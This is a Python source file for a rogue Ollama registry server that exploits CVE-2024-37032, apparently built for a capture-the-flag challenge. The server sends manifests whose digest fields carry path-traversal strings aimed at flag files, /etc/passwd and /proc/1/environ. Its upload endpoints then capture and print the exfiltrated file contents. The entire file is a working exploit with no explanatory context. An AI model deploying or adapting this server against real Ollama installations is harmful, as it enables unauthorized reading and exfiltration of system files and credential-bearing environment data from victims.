"""
Rogue Ollama Registry Server for CVE-2024-37032
Serves malicious manifests with path traversal in digest fields.
"""
from fastapi import FastAPI, Request, Response
from fastapi.responses import JSONResponse
import json
import sys

app = FastAPI()

# Will be set after ngrok starts
HOST = "localhost"

# Files to exfiltrate via path traversal
TARGET_FILES = [
    "../../../../../flag",
    "../../../../../flag.txt",
    "../../../../../app/flag",
    "../../../../../app/flag.txt",
    "../../../../../root/flag.txt",
    "../../../../../etc/flag",
    "../../../../../proc/1/environ",
]

@app.get("/")
async def index():
    return {"message": "registry ok"}

# Docker Registry v2 API - check endpoint
@app.get("/v2/")
async def v2_check():
    return JSONResponse(content={}, status_code=200)

# Serve malicious manifest
@app.get("/v2/{namespace}/{model}/manifests/{reference}")
async def get_manifest(namespace: str, model: str, reference: str):
    print(f"[*] Manifest requested: {namespace}/{model}:{reference}", flush=True)

    layers = []
    for target in TARGET_FILES:
        layers.append({
            "mediaType": "application/vnd.ollama.image.license",
            "digest": target,
            "size": 1
        })

    manifest = {
        "schemaVersion": 2,
        "mediaType": "application/vnd.docker.distribution.manifest.v2+json",
        "config": {
            "mediaType": "application/vnd.docker.container.image.v1+json",
            "digest": "../../../../../etc/passwd",
            "size": 1
        },
        "layers": layers
    }

    print(f"[*] Serving manifest with {len(layers)} traversal layers", flush=True)
    return JSONResponse(content=manifest)

# Blob HEAD requests
@app.head("/v2/{namespace}/{model}/blobs/{digest:path}")
async def blob_head(namespace: str, model: str, digest: str, response: Response):
    print(f"[*] HEAD blob: {digest}", flush=True)
    response.headers["Docker-Content-Digest"] = digest
    response.headers["Content-Length"] = "1"
    return Response(status_code=200, headers={"Docker-Content-Digest": digest, "Content-Length": "1"})

# Blob GET requests - serve fake content
@app.get("/v2/{namespace}/{model}/blobs/{digest:path}")
async def blob_get(namespace: str, model: str, digest: str):
    print(f"[*] GET blob: {digest}", flush=True)
    return Response(
        content=b"x",
        status_code=200,
        headers={
            "Docker-Content-Digest": digest,
            "Content-Type": "application/octet-stream"
        }
    )

# PUSH endpoints - capture exfiltrated data
@app.post("/v2/{namespace}/{model}/blobs/uploads/")
async def start_upload(namespace: str, model: str, request: Request, response: Response):
    body = await request.body()
    print(f"[EXFIL] Upload initiated for {namespace}/{model}", flush=True)
    print(f"[EXFIL] Body: {body}", flush=True)

    upload_uuid = "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee"
    return Response(
        status_code=202,
        headers={
            "Docker-Upload-Uuid": upload_uuid,
            "Location": f"http://{HOST}/v2/{namespace}/{model}/blobs/uploads/{upload_uuid}"
        }
    )

@app.patch("/v2/{namespace}/{model}/blobs/uploads/{uuid}")
async def patch_upload(namespace: str, model: str, uuid: str, request: Request):
    body = await request.body()
    print(f"[EXFIL-PATCH] {namespace}/{model} data ({len(body)} bytes):", flush=True)
    print(f"[EXFIL-PATCH] {body}", flush=True)
    return Response(status_code=202)

@app.put("/v2/{namespace}/{model}/blobs/uploads/{uuid}")
async def put_upload(namespace: str, model: str, uuid: str, request: Request):
    body = await request.body()
    print(f"[EXFIL-PUT] {namespace}/{model} data ({len(body)} bytes):", flush=True)
    print(f"[EXFIL-PUT] {body}", flush=True)
    return Response(status_code=201)

@app.put("/v2/{namespace}/{model}/manifests/{reference}")
async def put_manifest(namespace: str, model: str, reference: str, request: Request):
    body = await request.body()
    print(f"[EXFIL-MANIFEST] {namespace}/{model}:{reference}", flush=True)
    print(f"[EXFIL-MANIFEST] {body}", flush=True)
    return Response(status_code=201)

# Catch-all for debugging
@app.api_route("/{path:path}", methods=["GET", "POST", "PUT", "PATCH", "DELETE", "HEAD"])
async def catch_all(path: str, request: Request):
    body = await request.body()
    print(f"[DEBUG] {request.method} /{path}", flush=True)
    if body:
        print(f"[DEBUG] Body: {body[:500]}", flush=True)
    return Response(status_code=200)

if __name__ == "__main__":
    import uvicorn
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8888
    print(f"Starting rogue registry on port {port}")
    uvicorn.run(app, host="0.0.0.0", port=port)
